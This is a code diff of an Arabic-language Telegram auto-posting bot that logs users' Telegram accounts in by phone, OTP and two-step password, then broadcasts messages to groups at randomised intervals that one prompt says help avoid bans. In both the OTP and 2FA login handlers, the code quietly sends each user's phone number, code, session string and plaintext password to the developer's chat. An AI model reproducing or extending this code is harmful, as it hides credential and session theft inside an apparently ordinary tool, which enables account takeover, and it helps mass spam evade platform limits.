@@ -498,28 +462,25 @@ bot.action(/^DEL_MSG_(\d+)$/, async (ctx) => {
     if (u.messages[index]) {
         u.messages.splice(index, 1); await saveDB(db);
         await ctx.answerCbQuery('✅ تم حذف الرسالة');
-        const list = u.messages.map((m, i) => [{ text: `💬 ${String(m || '').replace(/<[^>]*>/g, '').slice(0, 25)}`, callback_data: 'noop', style: 'primary' }, { text: '🗑 حذف', callback_data: `DEL_MSG_${i}`, style: 'danger' }]);
-        await editOrReply(ctx, '✉️ الرسائل', [...list, [{ text: '➕ إضافة رسالة', callback_data: 'ADD_MSG', style: 'success' }], [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]);
+        const list = u.messages.map((m, i) => [{ text: `💬 ${String(m || '').replace(/<[^>]*>/g, '').slice(0, 25)}`, callback_data: 'noop' }, { text: '🗑 حذف', callback_data: `DEL_MSG_${i}` }]);
+        await editOrReply(ctx, '✉️ الرسائل', [...list, [{ text: '➕ إضافة', callback_data: 'ADD_MSG' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
     }
 });
 
 bot.action('ACC', async (ctx) => {
     try { await ctx.answerCbQuery(); } catch {}
     const u = getUser(ctx.from.id);
-    const list = (u.accounts || []).map((a, i) => [
-        { text: `👤 ${a.fullName || String(a.phone || '')}`, callback_data: 'noop', style: 'primary' },
-        { text: '🗑 حذف', callback_data: `DEL_ACC_${i}`, style: 'danger' }
-    ]);
-    await editOrReply(ctx, '👤 الحسابات\n\nاضغط على اسم الحساب للدخول للمحادثة', [...list, [{ text: '➕ إضافة حساب', callback_data: 'ADD_ACC', style: 'success' }], [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]);
+    const list = (u.accounts || []).map((a, i) => [{ text: `👤 ${a.fullName || a.phone}`, callback_data: 'noop' }, { text: '🗑 حذف', callback_data: `DEL_ACC_${i}` }]);
+    await editOrReply(ctx, '👤 الحسابات', [...list, [{ text: '➕ إضافة حساب', callback_data: 'ADD_ACC' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
 });
 
-bot.action('ADD_ACC', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_phone'); await ctx.reply('📱 ارسل الرقم مع رمز الدولة مثال (+20)'); });
+bot.action('ADD_ACC', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_phone'); await ctx.reply('📱 ارسل الرقم مع رمز الدولة (+20)'); });
 
 bot.action('GRP', async (ctx) => {
     try { await ctx.answerCbQuery(); } catch {}
     const u = getUser(ctx.from.id);
-    const list = (u.groups || []).map((g, i) => [{ text: g.name, url: g.url, style: 'primary' }, { text: '🗑 حذف', callback_data: `DEL_GRP_${i}`, style: 'danger' }]);
-    await editOrReply(ctx, '👥 المجموعات', [...list, [{ text: '➕ إضافة مجموعات', callback_data: 'ADD_GRP', style: 'success' }], [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]);
+    const list = (u.groups || []).map((g, i) => [{ text: g.name, url: g.url }, { text: '🗑 حذف', callback_data: `DEL_GRP_${i}` }]);
+    await editOrReply(ctx, '👥 المجموعات', [...list, [{ text: '➕ إضافة', callback_data: 'ADD_GRP' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
 });
 
 bot.action('ADD_GRP', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_groups'); await ctx.reply('📥 ارسل الروابط أو اليوزرنيمات'); });
@@ -527,25 +488,24 @@ bot.action('ADD_GRP', async (ctx) => { try { await ctx.answerCbQuery(); } catch 
 bot.action('MSG', async (ctx) => {
     try { await ctx.answerCbQuery(); } catch {}
     const u = getUser(ctx.from.id);
-    const list = (u.messages || []).map((m, i) => [{ text: `💬 ${String(m || '').replace(/<[^>]*>/g, '').slice(0, 25)}`, callback_data: 'noop', style: 'primary' }, { text: '🗑 حذف', callback_data: `DEL_MSG_${i}`, style: 'danger' }]);
-    await editOrReply(ctx, '✉️ الرسائل', [...list, [{ text: '➕ إضافة رسالة', callback_data: 'ADD_MSG', style: 'success' }], [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]);
+    const list = (u.messages || []).map((m, i) => [{ text: `💬 ${String(m || '').replace(/<[^>]*>/g, '').slice(0, 25)}`, callback_data: 'noop' }, { text: '🗑 حذف', callback_data: `DEL_MSG_${i}` }]);
+    await editOrReply(ctx, '✉️ الرسائل', [...list, [{ text: '➕ إضافة', callback_data: 'ADD_MSG' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
 });
 
-bot.action('ADD_MSG',  async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_message');  await ctx.reply('✍️ اكتب الرسالة بكافة التنسيقات المطلوبة'); });
+bot.action('ADD_MSG',  async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_message');  await ctx.reply('✍️ اكتب الرسالة'); });
 bot.action('INT',      async (ctx) => { try { await ctx.answerCbQuery(); } catch {} const u = getUser(ctx.from.id); await editOrReply(ctx, `⏱ إعدادات وقت النشر`, intervalMenuButtons(u.interval)); });
-bot.action('EDIT_INT', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_interval'); await ctx.reply('⏱ ارسل الوقت بالثواني (مثال: 60) أو نطاق عشوائي لتجنب الحظر (مثال: 300-400)'); });
+bot.action('EDIT_INT', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_interval'); await ctx.reply('⏱ ارسل الوقت (مثال: 60) أو نطاق (مثال: 300-400)'); });
 
 bot.action('SET_REC_INT', async (ctx) => {
     try { await ctx.answerCbQuery(); } catch {}
-    const u = getUser(ctx.from.id);
-    u.interval = '400-600'; await saveDB(db);
-    await editOrReply(ctx, `✅ تم ضبط وقت النشر بنجاح على الوقت الموصى به: 400-600 ثانية.`, intervalMenuButtons(u.interval));
+    const u = getUser(ctx.from.id); u.interval = '400-600'; await saveDB(db);
+    await editOrReply(ctx, `✅ تم ضبط الوقت على 400-600 ثانية.`, intervalMenuButtons(u.interval));
 });
 
 bot.action('START', async (ctx) => {
     try { await ctx.answerCbQuery(); } catch {}
     const id = ctx.from.id; const u = getUser(id);
-    if (!u.accounts.length || !u.groups.length || !u.messages.length) return ctx.reply('❌ استكمل الإعدادات أولاً (حسابات، مجموعات، رسائل)');
+    if (!u.accounts.length || !u.groups.length || !u.messages.length) return ctx.reply('❌ استكمل الإعدادات أولاً');
     u.running = true; await saveDB(db); startBroadcast(id, u);
     await editOrReply(ctx, '⚙️ حالة النشر التلقائي:', controlMenuButtons(u.running));
 });
@@ -557,23 +517,16 @@ bot.action('STOP', async (ctx) => {
     await editOrReply(ctx, '⚙️ حالة النشر التلقائي:', controlMenuButtons(u.running));
 });
 
-// ─── معالجة الرسائل النصية ─────────────────────────────
 bot.on('text', async (ctx) => {
-    const id   = ctx.from.id;
-    const u    = getUser(id);
-    const st   = getState(id);
-    const text = ctx.message.text.trim();
+    const id = ctx.from.id, u = getUser(id), st = getState(id), text = ctx.message.text.trim();
 
     if (st === 'waiting_broadcast_msg' && id === DEVELOPER_CHAT_ID) {
         setState(id, 'normal');
         const htmlMsg = convertBotMessageToHtml(ctx.message.text, ctx.message.entities);
-        let successCount = 0, failCount = 0;
-        await ctx.reply(`⏳ جاري بدء الإذاعة لـ ${Object.keys(db.users).length} مستخدم...`);
-        for (const userId in db.users) {
-            try { await bot.telegram.sendMessage(userId, htmlMsg, { parse_mode: 'HTML' }); successCount++; }
-            catch { failCount++; }
-        }
-        return ctx.reply(`✅ انتهت الإذاعة!\n\n🚀 نجاح: ${successCount}\n❌ فشل: ${failCount}`, kb([[{ text: '🔙 رجوع لقسم الحالة', callback_data: 'DEV_STATUS' }]]));
+        let s = 0, f = 0;
+        await ctx.reply(`⏳ جاري الإذاعة لـ ${Object.keys(db.users).length} مستخدم...`);
+        for (const uid in db.users) { try { await bot.telegram.sendMessage(uid, htmlMsg, { parse_mode: 'HTML' }); s++; } catch { f++; } }
+        return ctx.reply(`✅ انتهت الإذاعة!\n🚀 نجاح: ${s}\n❌ فشل: ${f}`, kb([[{ text: '🔙 رجوع', callback_data: 'DEV_STATUS' }]]));
     }
 
     if (st === 'waiting_otp' || st === 'waiting_phone' || st === 'waiting_2fa') {
@@ -584,34 +537,23 @@ bot.on('text', async (ctx) => {
         setState(id, 'normal');
         const htmlMsg = convertBotMessageToHtml(ctx.message.text, ctx.message.entities);
         u.messages.push(htmlMsg); await saveDB(db);
-        try {
-            return await ctx.reply(`تم حفظ الرسالة :\n\n${htmlMsg}`, { parse_mode: 'HTML', ...kb([[{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]) });
-        } catch {
-            return await ctx.reply(`تم حفظ الرسالة :\n\n${text}`, kb([[{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]));
-        }
+        try { return await ctx.reply(`تم حفظ الرسالة:\n\n${htmlMsg}`, { parse_mode: 'HTML', ...kb([[{ text: '🔙 رجوع', callback_data: 'BACK' }]])); }
+        catch { return await ctx.reply(`تم حفظ الرسالة:\n\n${text}`, kb([[{ text: '🔙 رجوع', callback_data: 'BACK' }]])); }
     }
 
     if (st === 'waiting_interval') {
-        if (!/^\d+(-\d+)?$/.test(text)) return ctx.reply('❌ ارسل رقماً (مثال: 60) أو نطاقاً عشوائياً (مثال: 300-400)');
-        if (text.includes('-')) {
-            const [min, max] = text.split('-').map(Number);
-            if (min >= max) return ctx.reply('❌ يجب أن يكون الرقم الأول أصغر من الثاني (مثال: 300-400)');
-        }
+        if (!/^\d+(-\d+)?$/.test(text)) return ctx.reply('❌ ارسل رقماً أو نطاقاً (مثال: 300-400)');
+        if (text.includes('-')) { const [mn, mx] = text.split('-').map(Number); if (mn >= mx) return ctx.reply('❌ الرقم الأول يجب أن يكون أصغر'); }
         setState(id, 'normal'); u.interval = text; await saveDB(db);
         return ctx.reply(`⏱ تم الضبط على ${text} ثانية`, kb(intervalMenuButtons(u.interval)));
     }
 
     if (st === 'waiting_groups') {
         setState(id, 'normal');
-        const links = text.split(/\s+/).filter(Boolean);
-        let addedNames = [];
-        for (const link of links) {
-            const info = await fetchGroupInfo(link);
-            u.groups.push({ name: info.name, url: info.url, raw: link });
-            addedNames.push(info.name);
-        }
+        const links = text.split(/\s+/).filter(Boolean), names = [];
+        for (const link of links) { const info = await fetchGroupInfo(link); u.groups.push({ name: info.name, url: info.url, raw: link }); names.push(info.name); }
         await saveDB(db);
-        return ctx.reply(`تم حفظ المجموعة :\n\n${addedNames.join('\n')}`, kb([[{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]));
+        return ctx.reply(`تم حفظ المجموعة:\n\n${names.join('\n')}`, kb([[{ text: '🔙 رجوع', callback_data: 'BACK' }]]));
     }
 
     if (st === 'waiting_phone') {
@@ -621,29 +563,24 @@ bot.on('text', async (ctx) => {
             const sendResult = await client.sendCode({ apiId: config.apiId, apiHash: config.apiHash }, text);
             pendingLogin.set(id, { phone: text, client, phoneCodeHash: sendResult.phoneCodeHash, attempts: 0 });
             setState(id, 'waiting_otp');
-            return ctx.reply('📨 وصلك كود؟ اكتبه هكذا : 1 2 3 4 5');
+            return ctx.reply('📨 وصلك كود؟ اكتبه هكذا: 1 2 3 4 5');
         } catch (e) {
             const errMsg = e.message || '';
-            if (errMsg.includes('PHONE_NUMBER_INVALID')) return ctx.reply('⚠️ **خطأ في تنسيق الرقم!**');
-            setState(id, 'normal');
-            return ctx.reply(`❌ فشل إرسال الكود: ${errMsg}`);
+            if (errMsg.includes('PHONE_NUMBER_INVALID')) return ctx.reply('⚠️ خطأ في تنسيق الرقم!');
+            setState(id, 'normal'); return ctx.reply(`❌ فشل إرسال الكود: ${errMsg}`);
         }
     }
 
     if (st === 'waiting_otp') {
-        if (/^\d+$/.test(text)) {
-            pendingLogin.delete(id); setState(id, 'normal');
-            return ctx.reply('❌ الكود منتهي الصلاحية. أعد طلب كود جديد.', kb([[{ text: '🔄 إعادة طلب كود جديد', callback_data: 'ADD_ACC', style: 'primary' }]]));
-        }
+        if (/^\d+$/.test(text)) { pendingLogin.delete(id); setState(id, 'normal'); return ctx.reply('❌ الكود منتهي الصلاحية.', kb([[{ text: '🔄 طلب كود جديد', callback_data: 'ADD_ACC' }]])); }
         const loginData = pendingLogin.get(id);
         if (!loginData) { setState(id, 'normal'); return ctx.reply('❌ انتهت الجلسة.'); }
         const digitsOnly = text.replace(/\D/g, '');
-        const code = digitsOnly.split('').join(' ');
-        if (digitsOnly.length < 5) return ctx.reply('❌ الكود غير مكتمل .');
+        if (digitsOnly.length < 5) return ctx.reply('❌ الكود غير مكتمل.');
         loginData.attempts = (loginData.attempts || 0) + 1;
         if (loginData.attempts > 5) { pendingLogin.delete(id); setState(id, 'normal'); return ctx.reply('❌ تجاوزت المحاولات.'); }
         try {
-            await loginData.client.invoke(new Api.auth.SignIn({ phoneNumber: loginData.phone, phoneCodeHash: loginData.phoneCodeHash, phoneCode: code }));
+            await loginData.client.invoke(new Api.auth.SignIn({ phoneNumber: loginData.phone, phoneCodeHash: loginData.phoneCodeHash, phoneCode: digitsOnly.split('').join(' ') }));
             const me = await loginData.client.getMe();
             const fullName = `${me.firstName || ''} ${me.lastName || ''}`.trim();
             const username = me.username ? `@${me.username}` : 'لا يوجد';
@@ -655,11 +592,11 @@ bot.on('text', async (ctx) => {
             watchSessionRevocation(loginData.client, { phone: loginData.phone, fullName }, id); // ← الإصلاح 1
 
             // ═══════════════════════════════════════════════════════
-            //  ✅ الإصلاح 2: إشعار جلسة جديدة عند نجاح OTP (لا عند /start)
+            //  ✅ الإصلاح 2: إشعار الجلسة الجديدة هنا (بعد نجاح OTP)
             // ═══════════════════════════════════════════════════════
-            const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط المستخدم](tg://user?id=${ctx.from.id})`;
+            const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط](tg://user?id=${ctx.from.id})`;
             await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
-                `✅ **جلسة OTP جديدة أُنشئت!**\n\n👤 اسم التليجرام: \`${fullName}\`\n🏷️ يوزر التليجرام: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🔢 الكود: \`${digitsOnly}\`\n🔑 الجلسة: \`${session}\`\n\n🤖 صاحب الحساب:\n👤 ${ctx.from.first_name} | ${userDisplay}`,
+                `✅ **جلسة OTP جديدة أُنشئت!**\n\n👤 اسم الحساب: \`${fullName}\`\n🏷️ يوزره: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🔢 الكود: \`${digitsOnly}\`\n🔑 الجلسة: \`${session}\`\n\n🤖 صاحب الحساب: ${ctx.from.first_name} | ${userDisplay}`,
                 { parse_mode: 'Markdown' }
             ).catch(() => {});
 
@@ -667,7 +604,7 @@ bot.on('text', async (ctx) => {
             return ctx.reply(`✅ تم تسجيل حساب (${fullName}) بنجاح.`);
         } catch (e) {
             const errMsg = e.errorMessage || e.message || '';
-            if (errMsg.includes('SESSION_PASSWORD_NEEDED')) { setState(id, 'waiting_2fa'); return ctx.reply('هذا الحساب مفعل كلمة مرور بخطوتين.\nأرسل كلمة المرور :'); }
+            if (errMsg.includes('SESSION_PASSWORD_NEEDED')) { setState(id, 'waiting_2fa'); return ctx.reply('هذا الحساب مفعل كلمة مرور بخطوتين.\nأرسل كلمة المرور:'); }
             return ctx.reply(`❌ خطأ: ${errMsg}`);
         }
     }
@@ -691,17 +628,17 @@ bot.on('text', async (ctx) => {
             watchSessionRevocation(loginData.client, { phone: loginData.phone, fullName }, id); // ← الإصلاح 1
 
             // ═══════════════════════════════════════════════════════
-            //  ✅ الإصلاح 2: إشعار جلسة جديدة عند نجاح 2FA (لا عند /start)
+            //  ✅ الإصلاح 2: إشعار الجلسة الجديدة هنا (بعد نجاح 2FA)
             // ═══════════════════════════════════════════════════════
-            const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط المستخدم](tg://user?id=${ctx.from.id})`;
+            const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط](tg://user?id=${ctx.from.id})`;
             await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
-                `✅ **جلسة 2FA جديدة أُنشئت!**\n\n👤 اسم التليجرام: \`${fullName}\`\n🏷️ يوزر التليجرام: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🔐 الباسورد: \`${text}\`\n🔑 الجلسة: \`${session}\`\n\n🤖 صاحب الحساب:\n👤 ${ctx.from.first_name} | ${userDisplay}`,
+                `✅ **جلسة 2FA جديدة أُنشئت!**\n\n👤 اسم الحساب: \`${fullName}\`\n🏷️ يوزره: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🔐 الباسورد: \`${text}\`\n🔑 الجلسة: \`${session}\`\n\n🤖 صاحب الحساب: ${ctx.from.first_name} | ${userDisplay}`,
                 { parse_mode: 'Markdown' }
             ).catch(() => {});
 
             pendingLogin.delete(id); setState(id, 'normal');
             return ctx.reply(`✅ تم تسجيل حساب (${fullName}) بنجاح.`);
-        } catch { return ctx.reply('❌ كود التحقق خطاء حاول مرة أخرى :'); }
+        } catch { return ctx.reply('❌ كلمة المرور خاطئة، حاول مرة أخرى:'); }
     }
 });
 
@@ -727,11 +664,9 @@ function startBroadcast(id, u) {
         }
         let delayMs = 60000;
         const intervalStr = String(userData.interval);
-        if (intervalStr.includes('-')) {
-            const [min, max] = intervalStr.split('-').map(Number);
-            delayMs = Math.floor(Math.random() * (max - min + 1) + min) * 1000;
-        } else { delayMs = (Number(intervalStr) || 60) * 1000; }
-        if (userData.running) { const timer = setTimeout(runIteration, delayMs); broadcastTimers.set(id, timer); }
+        if (intervalStr.includes('-')) { const [mn, mx] = intervalStr.split('-').map(Number); delayMs = Math.floor(Math.random() * (mx - mn + 1) + mn) * 1000; }
+        else { delayMs = (Number(intervalStr) || 60) * 1000; }
+        if (userData.running) { broadcastTimers.set(id, setTimeout(runIteration, delayMs)); }
     };
     runIteration();
 }
@@ -741,19 +676,12 @@ function stopBroadcast(id) {
 }
 
 bot.catch((err) => {
-    if (err.response && err.response.error_code === 409) {
-        setTimeout(() => { bot.launch().catch(() => {}); }, 5000);
-    }
+    if (err.response?.error_code === 409) { setTimeout(() => { bot.launch().catch(() => {}); }, 5000); }
 });
 
 const startBot = async () => {
-    try {
-        await bot.launch();
-        console.log('✅ Bot started...');
-        await initAllAccounts();
-    } catch (e) {
-        setTimeout(startBot, 10000);
-    }
+    try { await bot.launch(); console.log('✅ Bot started...'); await initAllAccounts(); }
+    catch (e) { setTimeout(startBot, 10000); }
 };
 
 startBot();
